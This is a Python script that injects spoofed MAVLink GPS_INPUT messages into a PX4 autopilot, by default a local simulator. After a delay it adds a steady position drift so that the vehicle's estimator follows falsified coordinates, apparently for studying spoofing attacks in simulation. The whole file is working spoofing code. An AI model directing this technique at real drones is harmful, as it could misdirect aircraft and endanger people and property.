"""
MAVLink GPS_INPUT Spoofer (for PX4 SITL)
=========================================

Goal
----
Inject spoofed GPS fixes via MAVLink ``GPS_INPUT`` so PX4 *consumes* the spoofed
coordinates (system-level spoofing), instead of only changing logged CSV values.

Important Notes
---------------
- This requires ``pymavlink``::

      pip install pymavlink

- PX4 must be configured to accept MAVLink GPS as a GPS source.  In many PX4 SITL
  setups, the simulator already provides GPS; you may need to disable/override
  the simulated GPS or adjust estimator settings so the EKF actually uses the
  injected GPS.  If PX4 is still using the simulator GPS, your injection will not
  change the vehicle's belief.

- This script is intentionally standalone: run it in parallel with your flight
  logger/mission script.

Usage
-----
::

    # Basic drift spoof (default 1.5 m/s @ 45° after 10 s delay):
    python3 gps_input_spoofer.py

    # Custom connection and drift parameters:
    python3 gps_input_spoofer.py --master udp:127.0.0.1:14540 \\
        --rate-hz 5 --attack-start 20 --drift-rate-m-per-s 2.0 \\
        --drift-direction-deg 90

    # Immediate attack with fast injection rate:
    python3 gps_input_spoofer.py --attack-start 0 --rate-hz 20

Options
-------
  --master TEXT                MAVLink connection string (default: udp:127.0.0.1:14540)
  --rate-hz FLOAT              GPS_INPUT send rate in Hz (default: 10.0)
  --attack-start FLOAT         Seconds of clean pass-through before spoof begins (default: 10.0)
  --drift-rate-m-per-s FLOAT   Drift speed in m/s (default: 1.5)
  --drift-direction-deg FLOAT  Drift heading — 0 = north, 90 = east (default: 45.0)
  --fix-type INT               GPS fix type sent in GPS_INPUT (default: 3 = 3-D fix)
  --stale-timeout-s FLOAT      Warn if no position update received for this many seconds (default: 5.0)

Exit behaviour
--------------
  Runs until interrupted with Ctrl-C.  Exits cleanly with a summary line.
"""

import argparse
import logging
import math
import sys
import time
from dataclasses import dataclass

from pymavlink import mavutil

# ---------------------------------------------------------------------------
# Logging (standalone — no dependency on project utils)
# ---------------------------------------------------------------------------
logger = logging.getLogger("gps_input_spoofer")
logger.setLevel(logging.DEBUG)
if not logger.handlers:
    _handler = logging.StreamHandler()
    _handler.setFormatter(
        logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")
    )
    logger.addHandler(_handler)

# ---------------------------------------------------------------------------
# Geodetic helpers (standalone copies — see module docstring)
# ---------------------------------------------------------------------------

def meters_to_lat_offset(meters: float) -> float:
    """Convert a north/south displacement in metres to a latitude offset in degrees."""
    return meters / 111_111.0


def meters_to_lon_offset(meters: float, lat_deg: float) -> float:
    """Convert an east/west displacement in metres to a longitude offset in degrees."""
    cos_lat = math.cos(math.radians(lat_deg))
    if abs(cos_lat) < 0.001:
        return 0.0
    return meters / (111_111.0 * cos_lat)


# ---------------------------------------------------------------------------
# Drift model
# ---------------------------------------------------------------------------

@dataclass
class Drift:
    """Constant-velocity drift vector decomposed into north / east components."""
    north_mps: float
    east_mps: float


def make_drift(rate_mps: float, direction_deg: float) -> Drift:
    """Create a Drift from a speed and compass heading (0 = north, 90 = east)."""
    dir_rad = math.radians(direction_deg)
    return Drift(
        north_mps=rate_mps * math.cos(dir_rad),
        east_mps=rate_mps * math.sin(dir_rad),
    )


# ---------------------------------------------------------------------------
# Argument validation
# ---------------------------------------------------------------------------

def validate_args(args: argparse.Namespace) -> None:
    """Raise ValueError if any CLI argument is out of range."""
    if args.rate_hz <= 0:
        raise ValueError("--rate-hz must be positive")
    if args.rate_hz > 200:
        logger.warning("--rate-hz > 200 Hz is unusually high; MAVLink may not keep up")
    if args.attack_start < 0:
        raise ValueError("--attack-start must be >= 0")
    if args.drift_rate_m_per_s < 0:
        raise ValueError("--drift-rate-m-per-s must be >= 0")
    if args.fix_type not in range(0, 7):
        raise ValueError("--fix-type must be 0–6 (GPS fix type enum)")
    if args.stale_timeout_s <= 0:
        raise ValueError("--stale-timeout-s must be positive")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> int:
    """Run the GPS spoofer.  Returns 0 on clean exit, 1 on error."""
    p = argparse.ArgumentParser(
        description="Inject MAVLink GPS_INPUT drift spoof.",
        epilog="""
Examples:
  python3 gps_input_spoofer.py
  python3 gps_input_spoofer.py --master udp:127.0.0.1:14540 --rate-hz 5
  python3 gps_input_spoofer.py --attack-start 0 --drift-rate-m-per-s 2.0
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--master", default="udp:127.0.0.1:14540",
                    help="MAVLink connection string")
    p.add_argument("--rate-hz", type=float, default=10.0,
                    help="GPS_INPUT send rate (Hz)")
    p.add_argument("--attack-start", type=float, default=10.0,
                    help="Seconds of clean pass-through before spoof begins")
    p.add_argument("--drift-rate-m-per-s", type=float, default=1.5,
                    help="Drift speed (m/s)")
    p.add_argument("--drift-direction-deg", type=float, default=45.0,
                    help="Drift heading: 0=north, 90=east")
    p.add_argument("--fix-type", type=int, default=3,
                    help="GPS fix type (3=3D)")
    p.add_argument("--stale-timeout-s", type=float, default=5.0,
                    help="Warn if reference position older than this (seconds)")
    args = p.parse_args()

    # --- Validate arguments ---------------------------------------------------
    try:
        validate_args(args)
    except ValueError as e:
        logger.error(f"Invalid arguments: {e}")
        p.print_help()
        return 1

    # --- Connect and wait for heartbeat ---------------------------------------
    logger.info(f"Connecting to {args.master}")
    mav = mavutil.mavlink_connection(args.master, autoreconnect=True)

    hb = mav.wait_heartbeat(timeout=15)
    if hb is None:
        logger.error("Timed out waiting for MAVLink heartbeat (15 s). "
                      "Is PX4 SITL running and reachable?")
        return 1
    logger.info(f"Heartbeat received (system {hb.get_srcSystem()}, "
                f"component {hb.get_srcComponent()})")

    # --- Get initial reference position ---------------------------------------
    logger.info("Waiting for initial GLOBAL_POSITION_INT...")
    msg = mav.recv_match(type="GLOBAL_POSITION_INT", blocking=True, timeout=15)
    if msg is None:
        logger.error("Timed out waiting for GLOBAL_POSITION_INT (15 s). "
                      "Vehicle may not be publishing position yet.")
        return 1

    true_lat = msg.lat / 1e7
    true_lon = msg.lon / 1e7
    last_ref_time = time.time()
    logger.info(f"Reference position: lat={true_lat:.7f}, lon={true_lon:.7f}")

    # --- Prepare injection loop -----------------------------------------------
    drift = make_drift(args.drift_rate_m_per_s, args.drift_direction_deg)
    period = 1.0 / args.rate_hz
    start = time.time()
    stale_warned = False
    messages_sent = 0

    logger.info(
        f"Sending GPS_INPUT @ {args.rate_hz:.1f} Hz  |  "
        f"Attack at t={args.attack_start:.1f} s  |  "
        f"Drift {args.drift_rate_m_per_s:.2f} m/s @ "
        f"{args.drift_direction_deg:.0f}°"
    )

    try:
        while True:
            now = time.time()
            elapsed = now - start

            # --- Update reference (non-blocking) ------------------------------
            m = mav.recv_match(type="GLOBAL_POSITION_INT", blocking=False)
            if m is not None:
                true_lat = m.lat / 1e7
                true_lon = m.lon / 1e7
                last_ref_time = now
                stale_warned = False

            # --- Staleness check ----------------------------------------------
            ref_age = now - last_ref_time
            if ref_age > args.stale_timeout_s and not stale_warned:
                logger.warning(
                    f"Reference position is {ref_age:.1f} s old "
                    f"(threshold {args.stale_timeout_s:.1f} s). "
                    f"Connection may be lost."
                )
                stale_warned = True

            # --- Compute injection coordinates --------------------------------
            if elapsed >= args.attack_start:
                t = elapsed - args.attack_start
                off_n = drift.north_mps * t
                off_e = drift.east_mps * t
                lat = true_lat + meters_to_lat_offset(off_n)
                lon = true_lon + meters_to_lon_offset(off_e, true_lat)
                label = "attack"
            else:
                lat = true_lat
                lon = true_lon
                label = "normal"

            # --- Send GPS_INPUT -----------------------------------------------
            time_usec = int(now * 1e6)
            lat_int = int(lat * 1e7)
            lon_int = int(lon * 1e7)

            mav.mav.gps_input_send(
                time_usec,          # time_usec
                0,                  # gps_id
                0,                  # ignore_flags (0 = use all provided fields)
                0,                  # time_week_ms
                0,                  # time_week
                args.fix_type,      # fix_type
                lat_int,            # lat  (deg × 1e7)
                lon_int,            # lon  (deg × 1e7)
                0.0,                # alt  (m) — 0 unless spoofing altitude
                1.0,                # hdop
                1.0,                # vdop
                0.0,                # vn   (m/s)
                0.0,                # ve   (m/s)
                0.0,                # vd   (m/s)
                0.0,                # speed_accuracy  (m/s)
                0.0,                # horiz_accuracy  (m)
                0.0,                # vert_accuracy   (m)
                10,                 # satellites_visible
                0,                  # yaw  (cdeg)
            )
            messages_sent += 1

            # --- Periodic status every 5 s ------------------------------------
            if int(elapsed) % 5 == 0 and abs((elapsed % 5) - 0.0) < period:
                logger.info(
                    f"{label:6s}  t={elapsed:6.1f}s  "
                    f"lat={lat:.7f}  lon={lon:.7f}  "
                    f"(ref age {ref_age:.1f}s, sent {messages_sent})"
                )

            time.sleep(period)

    except KeyboardInterrupt:
        logger.info(
            f"Stopped by user after {time.time() - start:.1f} s "
            f"({messages_sent} messages sent)"
        )

    return 0


if __name__ == "__main__":
    sys.exit(main())